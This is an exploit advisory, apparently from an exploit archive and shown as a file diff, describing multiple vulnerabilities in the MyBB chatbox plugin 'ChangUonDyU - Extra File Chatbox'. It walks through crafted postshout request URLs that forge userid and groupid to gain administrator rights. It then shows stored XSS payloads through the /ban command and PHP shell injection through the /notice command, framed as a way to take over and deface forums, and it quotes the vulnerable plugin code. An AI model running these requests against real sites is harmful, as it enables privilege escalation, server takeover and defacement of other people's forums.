@@ -1,0 +1,145 @@
+id: 20707
+date: 04/28/2013
+title: ChangUonDyU - Extra File Chatbox v3.6.0 Multiple vulnerabilities
+author: Inquiry
+cves: 
+
+# Exploit Title: Multiple vulnerabilities in ChangUonDyU - Extra File Chatbox 
+# Date: 03.02.2013
+# Author: Inquiry from http://crackhackforum.com
+# Vendor or Software Link: http://community.mybb.com/thread-63559.html
+# Software Link: community.mybb.com/attachment.php?aid=17079
+# Version: Affected are all versions up to 3.6.2
+# Google Keywords: 
+# Tested on: Opera 12.15 & FireFox 21
+##Greetings to all http://crackhackforum.com members.##
+
+########################################################################################
+[Introduction]
+ChangUonDyU - Extra File Chatbox is a MyBB plugin used for live chatting with other users on the forum. The developer was probably quite lazy(no offense) because of the high amount of vulnerabilities in the plugin. With a short look there exists several persistent Cross Site Scripting vulnerabilities, Code Execution and Authentication Vulnerability. Despite the XSS and Code Execution are the most dangerous in the list, Authentication vulnerability makes it all possible to happen. The impact of the vulnerability is very dangerous and combining all these could lead to defacing. To be exact it's possible to upload a shell to the target server and with just being a regular user. The concept is actually easy, A regular member is able to register the forum and use the shoutbox. As there is a 'small' Authentication vulnerability the regular member with no permissions at all is able to gain Administrator privileges to perform the actions any person with real privileges is able to. Yet with having Administrator privileges it's possible to trigger several XSS's and Code Execution. With persistent XSS we're able to steal the Security tokens of Administrator to perform CSRF & with Code Execution we're able to execute our shell on the targets system. 
+
+[0x01 XSS]
+Actually there's no XSS protection at all and all the forms are vulnerable to it. The ones which are appearing the most are with the 'Ban User' command and 'Notice' command. In this example I'll tell you the XSS with the Ban command because we'll upload the shell with the /notice command.
+Banning works by entering a banning command which states the user ID and banning reason as such : /ban 1(bans the person with ID 1 in the forum) Advertising(The reason which goes to the logs to review incase you'd like to unban). By removing the banning reason with the XSS payload, it'll be executed.
+
+Example : Original & XSS banning commands which will ban the person with User ID 1 which is mostly Administrator
+Original : /ban 1 advertising 
+Malicious : /ban 1 <script>alert('1')</script>
+
+Note: XSS won't disappear after unbanning the user, no matter if you're even re-banning him several times. As the messge goes to the Archive of the shoutbox, it'll leave only after using the /prune command to clear the chatbox & it's archive.
+The questions remains, how we're able to use it because only administrators and Staffs/Moderators are able to ban. There's also a solution to this, if you read the above then you know that there's also a Authentication vulnerability which allows us to gain the rights. Scroll down the page to find out how although I suggest to keep reading.
+
+Proof of Concept : 
+function build_ban($shout)
+{
+	global $config,$phrase;
+	$text = "ban > $shout[userid] > $shout[username] > $shout[dateline] > <span class='smallfont'>#<b>$shout[username]</b> ";
+	if (!empty($shout['banusername']))
+	{
+		$text .= "$phrase[banned_name] <a href='http://{$config['cbforumlink']}/member.php?action=profile&uid=$shout[banuserid]' target='_blank'>$shout[banusername]</a>";
+	}
+	else
+	{
+		$text .= "$phrase[banned] <a href='http://{$config['cbforumlink']}/member.php?action=profile&uid=$shout[banuserid]' target='_blank'>$shout[banuserid]</a>";
+	}
+	if ($shout['reason']) $text .= ". <i>$phrase[reason]: $shout[reason].</i>";
+	$text .= '#</span>';
+	return $text;
+}
+
+[0x02 Code Execution]
+Like I told above there are several vulnerabilities and alot of XSS's and almost all the forms in the chatbox's Cpanel aren't having any kind of protection. So doesn't have the /notice page it either. It's actually quite easy to trigger the XSS in there because we just have to insert our payload as a Notice, but as I said there's no protection which gives us an oppornutunity for Code Execution. You're almost all smart enough in here I assume that you know what that means, but I'll go through it with a sentence to make it clear to everyone. With entering XSS payload as the notice such as <script>alert('1')</script> it'll be executed. Yet we can replace the XSS payload with the code we'd like and that code could be a PHP shell and it'll be executed on the server and gives us access to it. Yet again we don't have any permissions to trigger the Code Execution, but read below because there's the solution. The downside of this is that you can access the shell through the shoutbox and that's obvious as we executed the shell through the shoutbox's notice. You can use any of these 404:forbidden shells because that'll give you some extra time yet that's enough to make another backdoor and put the shoutbox working again although it works, just the notice will appear as a 404:forbidden. 
+
+Proof of Concept : 
+function build_notice()
+{
+        global $fcbfile,$smilies;
+        $noticef = file_get_contents($fcbfile['notice']);
+        $handle = fopen($fcbfile['ds_notice'],"w");
+        if ($noticef)
+        {
+                $noticef = BBCode($noticef);
+                $noticef = strtr($noticef, $smilies);
+        }
+        fwrite($handle, $noticef);
+        fclose($handle);
+}
+
+[0x03 Authentication Vulnerability]
+That's probably the most interesting finding in the whole package, atleast it is in my sight and that's the point which makes the two above & one below possible. When I was looking for various security risks in the plugin I also opened up HTTP live header which is a popular FireFox addon for viewing the HTTP traffic going by. With chatting to myself in the WAMP I also took a look at the HTTP headers and noticed that the HTTP requests for posting a message in the shoutbox and it looked as following : 
+
+Explained : http://host.ltd/[path]/chatbox/index.php?do=postshout&key=[SSID]&userid=1000&groupid=1&username=<span style="color: [The color of the username];"><strong>[Name]</strong></span>&message=[Message]
+Real request : http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=2&groupid=1&username=<span style="color: #5EFF00;"><strong>Inquiry</strong></span>&message=Inquiry
+
+That made me think how did the developer managed to verify that the request is coming from a legitimate user. By seeing the previous work of the developer I were sure that I'm also able to find something out of there because verifying or locking the permissions would be quite hard for him. With few minutes I thought how he most likely organized the "who has permissions to use commands" list and I thought that probably by gving them to the persons who're having the group ID of Administrators and Moderators/Staffs. And that's the point where I were quite sure that there probably even isn't any kind of protection. I decided to try my luck on that one and replaced the original request with this : 
+
+ http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span>&message=Admin
+ Like you can see I've changed some details with the original request. Actually almost all the data except the Security Token which protects against CSRF. I have changed the "UserID" from 2 to 1, "GroupID" from 1 to 4, "Color:" from #5EFF00 to #FF0000 and "Username" from Inquiry to Crackhackforum. Then let's give it a shot and load the request. After proccessing the request, there should appear a new message in the shoutbox. Yet now the username doesn't appear as yours, but as a Administrators. Your User ID doesn't show up as yours, but as Administrator's. And by the way how the developer gives permission of the shoutbox, by the group ID, you also have that one as Administrator as GroupID=4 belongs to Administrators. Also the username will look red like it is in most of MyBB forums. The best thing about is that you really are looking as a legitimate username and even another Administrator can't make sure that you're the wrong one. The conclusion we can make from here is that you're now a LEGIT administrator of the shoutbox and absolutely nobody can't claim otherwise. That's fun to play a Administrator on a random forum indeed, but we're still trying to make some more progress and go further. Like we know, we're being shown as Administrators and with the Administrator place there comes permissions to ban, prune & give new notices and alot more. That's how we're trying to make some progress. 
+ Now we'll test is our hint correct and are we able to use the Administrator's privileges. For that we'll just use a simple pruning command to see if it takes affect and if it does then it means we're successful. The pruning command would look as such then : 
+ 
+ http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span>&message=/prune
+ 
+ It worked and the shoutbox is being pruned by an Administrator which in this case are us. Now here are coming in the two previous findings above. First I'll show you how to use the banning command to perform XSS attack and as we're in the forum it might cause everything that XSS causes, but you can even create a small XSS worm with it in the forum. 
+ 
+ http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span>&message=/ban 1000 [XSS payload]
+ As we already know that we're Administrators with legit privileges it isn't a surprise for us that also that one works and the XSS will be executed. The second thing is adding the new notice which goes mainly through the chatbox's Cpanel where we don't have access, but it's also possible to update the notice through the shoutbox with a simple command which I'll show you. 
+ 
+ http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span>&message=/notice [<?php PHP shell goes here ?>]
+
+ After proccessing this code it'll be executed and you have your shell on the server which will give you permission to the whole database to do whatever you'd like. 
+Note*: You have to click the link(e.g posting it to the shoutbox and then clicking it) or otherwise the request won't be processed.
+Note*: You have to either decode the URL or remove the spaces. It's because you have to click the link, but if there are spaces then the URL will be read to the first space. 
+Note*: Your shoutbox might use the colors name instead of HEX values. It depends on the shoutbox you're using. 
+ Proof of Concept : 
+ ##### POST SHOUT #######
+if ($_REQUEST['do'] == 'postshout')
+{
+	$managegroup = explode(",", $config['managegroup']);
+	$shout = $_REQUEST;
+	
+	if ($config['check_domain_reffer'] AND !checkpost($config['forumlink'] , $_SERVER['HTTP_REFERER']))
+	{
+		echo $phrase['accessdenied'];
+		exit;
+	}
+	
+	$request_ip = $_SERVER['REMOTE_ADDR'];
+	
+	if ($config['strip_slash'])
+	{
+		$shout['username'] = stripslashes($shout['username']);
+		$shout['message'] = stripslashes($shout['message']);
+	}
+	
+	if ($config['check_chatbox_key'] AND !check_chatbox_key($shout['key'], $shout['userid'], $shout['username'], $shout['groupid']))
+	{
+		echo $phrase['accessdenied'];
+		exit;
+	}
+	
+	$banneds = unserialize(file_get_contents($fcbfile['ds_banned']));
+
+	$cancommand = false;
+	if (in_array($shout['groupid'], $managegroup))
+	{
+		$cancommand = true;
+	}
+	
+	if ($shout['message'] && $shout['userid'])
+	{
+		// CHECK BANNED USER
+		if (isset($banneds[$shout['userid']]))
+		{
+			echo $phrase['bannotice'];
+			exit;
+		}
+ 
+ [0x04 XSS & HTML injection on the HTTP request]
+ That's probably the same dangerous as the first XSS and comparing it to those vulnerabilities above it's basically nothing. Yet if I wouldn't find the other ones then it would be a critical one and I think it's worth to be mentioned. It's kinda related to the above vulnerability which means the /index.php?do=postshout can be exploited in several ways. Again, comparing to the above vulnerabilities it's kinda useless although maybe the Administrator blocks the other vulnerabilities and then it could work out. I think that expalaining of this doesn't need any further sentences because you can understand it from the link : 
+ 
+  http://host.ltd/[path]/chatbox/index.php?do=postshout&key=94762112822fa6da1c8be7c0b8aff852&userid=1&groupid=4&username=<span style="color: #FF0000;"><strong>CrackHackForum</strong></span><Here goes HTML or XSS>&message=CrackHackForum
+ 
+ Proof of Concept : The same as it's with the 0x03
+ ##Greetings to all http://crackhackforum.com members and specially to BaseHack Network crew members Thallium, DES and Vash.##
+
+#  0day.today [2023-03-26]  #
